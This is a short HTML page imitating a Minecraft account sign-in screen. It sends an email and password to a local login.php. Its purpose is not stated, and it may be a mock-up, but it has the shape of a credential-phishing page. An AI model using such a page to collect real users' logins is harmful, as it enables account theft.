<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Account Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1>Minecraft</h1>
            <p class="subtitle">Sign in to your Minecraft account</p>

            <!-- The form will send a POST request to the login.php page -->
            <form action="login.php" method="POST">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>

                <label for="password">Password:</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>

                <input type="submit" value="Sign In">
            </form>

            <p class="forgot-password"><a href="#">Forgot your password?</a></p>
            <div class="separator">
                <hr> <span>Or</span> <hr>
            </div>
            <button class="create-account">Create a new Minecraft Account</button>
        </div>
    </div>
</body>
</html>
